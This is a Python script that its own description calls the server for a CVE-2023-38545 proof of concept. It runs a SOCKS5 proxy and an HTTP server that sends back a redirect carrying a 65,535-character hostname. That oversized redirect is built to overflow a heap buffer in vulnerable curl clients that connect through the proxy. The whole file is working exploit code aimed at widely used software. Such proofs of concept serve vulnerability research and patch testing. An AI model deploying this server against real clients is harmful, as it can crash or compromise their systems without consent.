import socket
import threading
import logging
import argparse

# Initialize logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_string():
    """
    Generate a payload string for HTTP redirection.
    
    Returns:
        str: The generated payload string.
    """
    logger.debug("[+] Generating payload string for HTTP redirection")
    payload = "A" * 65535
    return payload

def socks5_proxy():
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("0.0.0.0", 1080))
        server.listen(5)
        logger.info("SOCKS5 proxy running on port 1080")
        
        while True:
            client_sock, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_sock,))
            client_thread.start()
    except Exception as e:
        logger.error(f"SOCKS5 Proxy Error: {e}")

def handle_client(client_socket):
    try:
        logger.debug(f"[+] Received SOCKS5 connection from {client_socket.getpeername()}")
        client_socket.recv(2)
        client_socket.sendall(b'\x05\x00')
        logger.debug("[+] SOCKS5 handshake complete")

        target_address = '127.0.0.1'
        target_port = 8080

        target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target.connect((target_address, target_port))
        client_socket.sendall(b'\x05\x00\x00\x01' + socket.inet_aton('127.0.0.1') + (8080).to_bytes(2, 'big'))
        logger.debug("[+] SOCKS5 connection established")

        get_request = f"GET / HTTP/1.1\r\nHost: {target_address}:{target_port}\r\n\r\n"
        target.send(get_request.encode('utf-8'))
        logger.debug(f"[+] Sent GET request to target {target.getpeername()}")

        while True:
            response = target.recv(65535*2)
            if response == b'':
                break
            logger.debug(f"[+] Received {len(response)} bytes from target {target.getpeername()}")
            client_socket.send(response)
            logger.debug(f"[+] Sent {len(response)} bytes to client {client_socket.getpeername()}")
    except Exception as e:
        logger.error(f"SOCKS5 Client Error: {e}")
        client_socket.close()
        target.close()

def http_server():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('0.0.0.0', 8080))
        server_socket.listen(5)
        logger.info("HTTP server running on port 8080")

        while True:
            client_socket, addr = server_socket.accept()
            logger.debug(f"[+] HTTP server received connection from {addr}")

            request = client_socket.recv(1024).decode('utf-8')
            logger.debug(f"[+] HTTP request: {request}")

            payload = generate_string()
            logger.debug("[+] Payload string generated")

            response = f"HTTP/1.1 301 Moved\r\nContent-Length: {len(payload)}\r\nConnection: Close\r\nLocation: http://localhost:8080/{payload}\r\n\r\n{payload}"
            logger.debug("[+] HTTP response generated")

            client_socket.sendall(response.encode('utf-8'))
            logger.debug(f"[+] HTTP response sent to client {addr}")

            client_socket.close()
    except Exception as e:
        logger.error(f"HTTP Server Error: {e}")

if __name__ == "__main__":
    # Argument parser for command-line options
    parser = argparse.ArgumentParser(description="Server for CVE-2023-38545 PoC")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")

    args = parser.parse_args()

    # Enable debug logging if --debug flag is set
    if args.debug:
        logger.setLevel(logging.DEBUG)

    socks5_thread = threading.Thread(target=socks5_proxy, daemon=True)
    http_thread = threading.Thread(target=http_server, daemon=True)
    
    socks5_thread.start()
    http_thread.start()
    
    socks5_thread.join()
    http_thread.join()
